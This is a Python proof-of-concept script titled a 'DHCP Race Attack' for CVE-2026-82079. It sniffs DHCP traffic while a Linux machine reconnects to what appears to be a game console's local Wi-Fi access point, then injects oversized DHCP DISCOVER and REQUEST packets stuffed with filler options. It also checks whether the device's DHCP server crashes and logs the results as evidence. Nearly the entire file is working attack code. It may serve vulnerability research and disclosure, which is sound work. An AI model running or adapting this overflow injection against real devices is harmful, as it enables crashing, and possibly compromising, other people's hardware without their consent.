#!/usr/bin/env python3
"""
CVE-2026-82079 — DHCP Race Attack

Instead of replacing NetworkManager's DHCP client, this races it:
1. Disconnects WiFi
2. User reconnects via NM (enter new PSK from QR code)
3. Script listens on raw socket and sends oversized DHCP packets
   in the brief window while the DHCP server is active

The lp2p DHCP server only responds during initial connection,
so we must inject during the association + DHCP window.

Usage:
    # Terminal 1: start the listener
    sudo python3 -I dhcp_race.py --iface wlp5s0

    # Terminal 2 (or same, after script says READY): reconnect
    nmcli device wifi connect switch_F3DCDB0100S --ask

    Script will detect the DHCP exchange and inject oversized packets.
"""

import socket
import struct
import random
import time
import argparse
import json
import sys
import os
import select
from pathlib import Path
from datetime import datetime, timezone

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "dhcp_attack"
DHCP_SERVER_PORT = 67
DHCP_CLIENT_PORT = 68


def evidence_dir():
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    return EVIDENCE_DIR


def get_mac(iface: str) -> bytes:
    with open(f"/sys/class/net/{iface}/address") as f:
        return bytes(int(b, 16) for b in f.read().strip().split(":"))


def mac_str(mac: bytes) -> str:
    return ":".join(f"{b:02x}" for b in mac)


def build_overflow_options(total_size: int, fill_byte: int = 0x41) -> bytes:
    """Build DHCP options totaling target bytes."""
    options = b""
    remaining = total_size
    opt_codes = [43, 60, 77] + list(range(224, 255))
    for opt_code in opt_codes:
        if remaining <= 2:
            break
        value_len = min(255, remaining - 2)
        options += bytes([opt_code, value_len]) + bytes([fill_byte] * value_len)
        remaining -= (2 + value_len)
    return options


def build_dhcp_discover(mac: bytes, extra: bytes = b"") -> tuple[bytes, int]:
    """Build DHCP DISCOVER with optional extra options."""
    xid = random.randint(0, 0xFFFFFFFF)
    pkt = struct.pack("!BBBB", 1, 1, 6, 0)
    pkt += struct.pack("!I", xid)
    pkt += struct.pack("!HH", 0, 0x8000)
    pkt += b"\x00" * 16
    pkt += mac + b"\x00" * 10
    pkt += b"\x00" * 64 + b"\x00" * 128
    pkt += b"\x63\x82\x53\x63"
    pkt += bytes([53, 1, 1])  # DISCOVER
    pkt += bytes([61, 7, 1]) + mac
    pkt += bytes([55, 4, 1, 3, 6, 28])
    pkt += bytes([12, 5]) + b"probe"
    pkt += extra
    pkt += bytes([255])
    return pkt, xid


def build_dhcp_request(mac: bytes, offered_ip: bytes, server_ip: bytes,
                       extra: bytes = b"") -> tuple[bytes, int]:
    """Build DHCP REQUEST with optional extra options."""
    xid = random.randint(0, 0xFFFFFFFF)
    pkt = struct.pack("!BBBB", 1, 1, 6, 0)
    pkt += struct.pack("!I", xid)
    pkt += struct.pack("!HH", 0, 0x8000)
    pkt += b"\x00" * 16
    pkt += mac + b"\x00" * 10
    pkt += b"\x00" * 64 + b"\x00" * 128
    pkt += b"\x63\x82\x53\x63"
    pkt += bytes([53, 1, 3])  # REQUEST
    pkt += bytes([61, 7, 1]) + mac
    pkt += bytes([54, 4]) + server_ip
    pkt += bytes([50, 4]) + offered_ip
    pkt += bytes([55, 4, 1, 3, 6, 28])
    pkt += bytes([12, 5]) + b"probe"
    pkt += extra
    pkt += bytes([255])
    return pkt, xid


def parse_dhcp_response(data: bytes) -> dict:
    """Parse DHCP response options."""
    result = {}
    result["your_ip"] = ".".join(str(b) for b in data[16:20])
    result["server_ip"] = ".".join(str(b) for b in data[20:24])

    cookie = data.find(b"\x63\x82\x53\x63")
    if cookie < 0:
        return result

    pos = cookie + 4
    while pos < len(data) and data[pos] != 255:
        if data[pos] == 0:
            pos += 1
            continue
        if pos + 1 >= len(data):
            break
        ot, ol = data[pos], data[pos + 1]
        if ot == 53 and ol >= 1:
            types = {1: "DISCOVER", 2: "OFFER", 3: "REQUEST", 5: "ACK", 6: "NAK"}
            result["msg_type"] = types.get(data[pos + 2], f"type({data[pos+2]})")
        if ot == 51 and ol == 4:
            result["lease"] = struct.unpack("!I", data[pos+2:pos+6])[0]
        pos += 2 + ol

    return result


def wait_and_inject(iface: str, overflow_size: int, timeout: float = 60):
    """Wait for DHCP traffic on the interface, then inject oversized packets.

    Listens for DHCP OFFER from the Switch, then sends our own
    oversized DISCOVER and REQUEST packets while the server is active.
    """
    mac = get_mac(iface)
    print(f"  MAC: {mac_str(mac)}")
    print(f"  Overflow target: {overflow_size}B extra options")

    # Create raw listening socket
    # We'll use a raw socket to see all DHCP traffic
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, 25, iface.encode())
    sock.settimeout(1)

    try:
        sock.bind(("0.0.0.0", DHCP_CLIENT_PORT))
    except OSError as e:
        print(f"  Cannot bind port 68: {e}")
        print(f"  NM's DHCP client may be holding it — this is expected")
        print(f"  Using alternative port strategy...")
        sock.close()
        return wait_and_inject_raw(iface, overflow_size, timeout)

    print(f"\n  READY — Waiting for DHCP traffic (connect to Switch AP now)")
    print(f"  Run: nmcli device wifi connect switch_F3DCDB0100S --ask\n")

    start = time.monotonic()
    results = []
    server_seen = False

    while time.monotonic() - start < timeout:
        try:
            data, addr = sock.recvfrom(4096)
        except socket.timeout:
            continue

        if addr[1] == DHCP_SERVER_PORT or (len(data) > 240 and data[0] == 2):
            # This is from the DHCP server
            parsed = parse_dhcp_response(data)
            msg_type = parsed.get("msg_type", "?")
            print(f"  ← Server: {msg_type} (from {addr}, {len(data)}B)")
            server_seen = True

            if msg_type in ("OFFER", "ACK"):
                # Server is active! Inject our oversized packets NOW
                print(f"\n  ★ SERVER IS ACTIVE — Injecting overflow packets!")

                extra = build_overflow_options(overflow_size)
                time.sleep(0.1)

                # Send oversized DISCOVER
                pkt, xid = build_dhcp_discover(mac, extra=extra)
                print(f"  → Sending oversized DISCOVER ({len(pkt)}B, extra={len(extra)}B)")
                try:
                    sock.sendto(pkt, ("255.255.255.255", DHCP_SERVER_PORT))
                except Exception as e:
                    print(f"    send error: {e}")

                # Wait for response
                try:
                    resp, raddr = sock.recvfrom(4096)
                    rp = parse_dhcp_response(resp)
                    print(f"  ← Response: {rp.get('msg_type', '?')} ({len(resp)}B)")
                    results.append({
                        "type": "discover_response",
                        "overflow_size": overflow_size,
                        "response": rp,
                        "response_size": len(resp),
                    })

                    # If we got an OFFER, send oversized REQUEST
                    if rp.get("msg_type") == "OFFER":
                        offered_ip = resp[16:20]
                        server_ip = resp[20:24]
                        if server_ip == b"\x00\x00\x00\x00":
                            server_ip = bytes([192, 168, 0, 1])

                        req_pkt, _ = build_dhcp_request(
                            mac, offered_ip, server_ip, extra=extra)
                        print(f"  → Sending oversized REQUEST ({len(req_pkt)}B)")
                        sock.sendto(req_pkt, ("255.255.255.255", DHCP_SERVER_PORT))

                        try:
                            resp2, _ = sock.recvfrom(4096)
                            rp2 = parse_dhcp_response(resp2)
                            print(f"  ← Response: {rp2.get('msg_type', '?')} ({len(resp2)}B)")
                            results.append({
                                "type": "request_response",
                                "overflow_size": overflow_size,
                                "response": rp2,
                            })
                        except socket.timeout:
                            print(f"  ✗ No response to oversized REQUEST — possible crash!")
                            results.append({
                                "type": "request_no_response",
                                "overflow_size": overflow_size,
                                "possible_crash": True,
                            })

                except socket.timeout:
                    print(f"  ✗ No response to oversized DISCOVER — possible crash!")
                    results.append({
                        "type": "discover_no_response",
                        "overflow_size": overflow_size,
                        "possible_crash": True,
                    })

                # Try one more normal DISCOVER to check if server is still alive
                time.sleep(2)
                probe, _ = build_dhcp_discover(mac)
                sock.sendto(probe, ("255.255.255.255", DHCP_SERVER_PORT))
                try:
                    resp3, _ = sock.recvfrom(4096)
                    print(f"  Server still alive after overflow test")
                    results.append({"alive_after": True})
                except socket.timeout:
                    print(f"  ⚠ Server NOT responding after overflow — CRASH?")
                    results.append({"alive_after": False, "possible_crash": True})

                break

        elif len(data) > 240 and data[0] == 1:
            # DHCP request from a client (NM or us)
            pass

    if not server_seen:
        print(f"  No DHCP server traffic seen in {timeout}s")

    sock.close()
    return results


def wait_and_inject_raw(iface: str, overflow_size: int, timeout: float = 60):
    """Fallback: use raw packet socket to inject alongside NM's DHCP client."""
    mac = get_mac(iface)
    extra = build_overflow_options(overflow_size)

    # Use raw ethernet socket to bypass port conflicts
    ETH_P_ALL = 0x0003
    try:
        raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
        raw.bind((iface, 0))
        raw.settimeout(1)
    except PermissionError:
        print("  Need root for raw socket")
        return []

    print(f"\n  READY (raw mode) — Connect to Switch AP now")
    print(f"  Run: nmcli device wifi connect switch_F3DCDB0100S --ask\n")

    start = time.monotonic()
    results = []

    while time.monotonic() - start < timeout:
        try:
            frame = raw.recv(65535)
        except socket.timeout:
            continue

        # Look for IP/UDP/DHCP: EtherType 0x0800, proto 17, dport/sport 67 or 68
        if len(frame) < 42:
            continue
        ethertype = struct.unpack("!H", frame[12:14])[0]
        if ethertype != 0x0800:
            continue

        ip_hdr_len = (frame[14] & 0x0F) * 4
        ip_start = 14
        proto = frame[ip_start + 9]
        if proto != 17:  # UDP
            continue

        udp_start = ip_start + ip_hdr_len
        if len(frame) < udp_start + 8:
            continue
        src_port, dst_port = struct.unpack("!HH", frame[udp_start:udp_start+4])

        if src_port == 67 and dst_port == 68:
            # DHCP response from server!
            dhcp_data = frame[udp_start + 8:]
            parsed = parse_dhcp_response(dhcp_data)
            msg_type = parsed.get("msg_type", "?")
            print(f"  ← Server: {msg_type} ({len(dhcp_data)}B)")

            if msg_type in ("OFFER", "ACK"):
                print(f"\n  ★ SERVER ACTIVE — Injecting overflow via UDP socket")
                time.sleep(0.2)

                # Open UDP socket for injection
                try:
                    inject = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    inject.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                    inject.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    inject.setsockopt(socket.SOL_SOCKET, 25, iface.encode())
                    # Use a different source port to avoid conflict with NM
                    inject.bind(("0.0.0.0", 10068))

                    # Send oversized DISCOVER from our port
                    pkt, xid = build_dhcp_discover(mac, extra=extra)
                    print(f"  → Oversized DISCOVER ({len(pkt)}B, extra={len(extra)}B)")
                    inject.sendto(pkt, ("255.255.255.255", DHCP_SERVER_PORT))

                    # Listen for response on raw socket
                    inject_start = time.monotonic()
                    got_response = False
                    while time.monotonic() - inject_start < 5:
                        try:
                            resp_frame = raw.recv(65535)
                        except socket.timeout:
                            continue
                        if len(resp_frame) < 42:
                            continue
                        if struct.unpack("!H", resp_frame[12:14])[0] != 0x0800:
                            continue
                        rip_start = 14
                        rip_hdr_len = (resp_frame[rip_start] & 0x0F) * 4
                        if resp_frame[rip_start + 9] != 17:
                            continue
                        rudp_start = rip_start + rip_hdr_len
                        rsp, rdp = struct.unpack("!HH", resp_frame[rudp_start:rudp_start+4])
                        if rsp == 67:
                            rdhcp = resp_frame[rudp_start + 8:]
                            rp = parse_dhcp_response(rdhcp)
                            # Check if this is a response to OUR xid
                            resp_xid = struct.unpack("!I", rdhcp[4:8])[0]
                            if resp_xid == xid:
                                print(f"  ← Response to OUR packet: {rp.get('msg_type', '?')}")
                                got_response = True
                                results.append({
                                    "overflow_size": overflow_size,
                                    "response": rp,
                                    "crashed": False,
                                })
                                break

                    if not got_response:
                        print(f"  ✗ No response to oversized DISCOVER")
                        results.append({
                            "overflow_size": overflow_size,
                            "no_response": True,
                            "possible_crash": True,
                        })

                    inject.close()
                except Exception as e:
                    print(f"  Injection error: {e}")

                break

    raw.close()
    return results


def main():
    parser = argparse.ArgumentParser(description="CVE-2026-82079 DHCP Race Attack")
    parser.add_argument("--iface", required=True, help="WiFi interface")
    parser.add_argument("--size", type=int, default=256,
                        help="Overflow option bytes to inject (default 256)")
    parser.add_argument("--timeout", type=float, default=90,
                        help="Seconds to wait for DHCP traffic")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("ERROR: Must run as root (sudo)")
        sys.exit(1)

    print("╔══════════════════════════════════════════════════════════╗")
    print("║  CVE-2026-82079 — DHCP Race Attack                     ║")
    print("║  Injects oversized DHCP packets during connection       ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"Interface: {args.iface}")
    print(f"Overflow size: {args.size}B")
    print(f"Time: {datetime.now(timezone.utc).isoformat()}")

    results = wait_and_inject(args.iface, args.size, timeout=args.timeout)

    if results:
        path = evidence_dir() / f"race_{args.size}B.json"
        with open(path, "w") as f:
            json.dump({
                "test": "dhcp_race",
                "size": args.size,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "results": results,
            }, f, indent=2, default=str)
        print(f"\nSaved: {path}")


if __name__ == "__main__":
    main()
